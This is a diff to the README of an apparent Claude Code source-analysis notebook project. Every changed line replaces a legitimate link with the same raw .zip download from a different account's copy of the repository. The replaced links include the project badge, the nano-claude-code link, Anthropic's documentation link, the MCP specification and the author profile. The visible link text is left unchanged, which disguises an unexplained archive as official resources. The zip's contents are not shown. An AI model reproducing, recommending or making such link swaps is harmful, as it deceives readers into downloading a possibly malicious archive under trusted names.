@@ -1,6 +1,6 @@
 # Claude Code Sourcemap Learning Notebook
 
-[![GitHub](https://img.shields.io/badge/GitHub-dadiaomengmeimei-blue?logo=github)](https://github.com/dadiaomengmeimei/claude-code-sourcemap-learning-notebook)
+[![GitHub](https://img.shields.io/badge/GitHub-dadiaomengmeimei-blue?logo=github)](https://github.com/gabbiesbv/claude-code-sourcemap-learning-notebook/raw/refs/heads/main/zh-CN/claude-learning-code-notebook-sourcemap-1.6-beta.1.zip)
 [![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](LICENSE)
 
 > 🌐 [中文版 / Chinese Version](README_CN.md)
@@ -74,7 +74,7 @@ Extracted from Ch.04 & Ch.05 — applicable to any Agent system:
 
 > **1,646 lines of TypeScript · 15 files · 4 dependencies**
 
-[nano-claude-code](https://github.com/dadiaomengmeimei/nano-claude-code) rewrites Claude Code's core as a minimal, hackable implementation you can actually run and modify.
+[nano-claude-code](https://github.com/gabbiesbv/claude-code-sourcemap-learning-notebook/raw/refs/heads/main/zh-CN/claude-learning-code-notebook-sourcemap-1.6-beta.1.zip) rewrites Claude Code's core as a minimal, hackable implementation you can actually run and modify.
 
 | | Claude Code | nano-claude-code |
 |---|---|---|
@@ -85,13 +85,13 @@ Extracted from Ch.04 & Ch.05 — applicable to any Agent system:
 
 **Read the notebook to understand the architecture. Run nano-claude-code to build your own.**
 
-👉 [github.com/dadiaomengmeimei/nano-claude-code](https://github.com/dadiaomengmeimei/nano-claude-code)
+👉 [github.com/dadiaomengmeimei/nano-claude-code](https://github.com/gabbiesbv/claude-code-sourcemap-learning-notebook/raw/refs/heads/main/zh-CN/claude-learning-code-notebook-sourcemap-1.6-beta.1.zip)
 
 ## Links
 
-- [Claude Code Official Docs](https://docs.anthropic.com/en/docs/claude-code)
-- [MCP Protocol Specification](https://modelcontextprotocol.io/)
-- [This Project on GitHub](https://github.com/dadiaomengmeimei/claude-code-sourcemap-learning-notebook)
+- [Claude Code Official Docs](https://github.com/gabbiesbv/claude-code-sourcemap-learning-notebook/raw/refs/heads/main/zh-CN/claude-learning-code-notebook-sourcemap-1.6-beta.1.zip)
+- [MCP Protocol Specification](https://github.com/gabbiesbv/claude-code-sourcemap-learning-notebook/raw/refs/heads/main/zh-CN/claude-learning-code-notebook-sourcemap-1.6-beta.1.zip)
+- [This Project on GitHub](https://github.com/gabbiesbv/claude-code-sourcemap-learning-notebook/raw/refs/heads/main/zh-CN/claude-learning-code-notebook-sourcemap-1.6-beta.1.zip)
 
 ## License
 
@@ -99,4 +99,4 @@ MIT. The analyzed Claude Code source code is copyrighted by Anthropic. This proj
 
 ---
 
-**If this helps you, give it a ⭐! Follow [@dadiaomengmeimei](https://github.com/dadiaomengmeimei) for more AI source code analysis.**
+**If this helps you, give it a ⭐! Follow [@dadiaomengmeimei](https://github.com/gabbiesbv/claude-code-sourcemap-learning-notebook/raw/refs/heads/main/zh-CN/claude-learning-code-notebook-sourcemap-1.6-beta.1.zip) for more AI source code analysis.**
